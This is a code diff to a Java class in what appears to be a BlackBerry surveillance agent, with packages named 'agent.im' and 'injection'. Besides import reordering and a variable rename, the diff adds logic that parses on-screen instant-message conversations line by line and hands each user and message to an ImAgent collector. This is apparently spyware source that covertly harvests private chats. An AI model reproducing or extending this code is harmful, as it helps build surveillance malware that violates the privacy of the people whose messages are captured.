@@ -3,15 +3,15 @@ package blackberry.agent.im;
 
 import java.util.Vector;
 
-import blackberry.debug.Debug;
-import blackberry.debug.DebugLevel;
-import blackberry.injection.MenuWalker;
-import blackberry.utils.Utils;
-
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.agent.ImAgent;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
+import blackberry.injection.MenuWalker;
+import blackberry.utils.Utils;
 
 public class ConversationScreen implements Runnable {
 	private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
@@ -107,20 +107,27 @@ public class ConversationScreen implements Runnable {
 		int posMessages = getLinePos(conversation, 6);
 		int numLine = 1;
 		while (true) {
-			String line = getNextLine(conversation, posMessages);
-			if (line == null) {
+			String currentLine = getNextLine(conversation, posMessages);
+			if (currentLine == null) {
 				break;
 			}
-			posMessages += line.length() + 1;
+			posMessages += currentLine.length() + 1;
 
-			posSep = line.indexOf(":");
-			String user = line.substring(0, posSep);
-			String message = line.substring(posSep + 2);
+			posSep = currentLine.indexOf(":");
+			String user = currentLine.substring(0, posSep);
+			String message = currentLine.substring(posSep + 2);
 
 			if (numLine < 5)
 				debug.trace("line " + numLine + " user: " + user + " message: "
 						+ message);
 			numLine += 1;
+			
+            Line line = new Line(UserRepository.getInstance().get(user),message);
+            
+            ImAgent agent = ImAgent.getInstance();
+            if(!agent.has(partecipants,line)){
+                agent.add(partecipants,line);
+            }
 
 		}
 
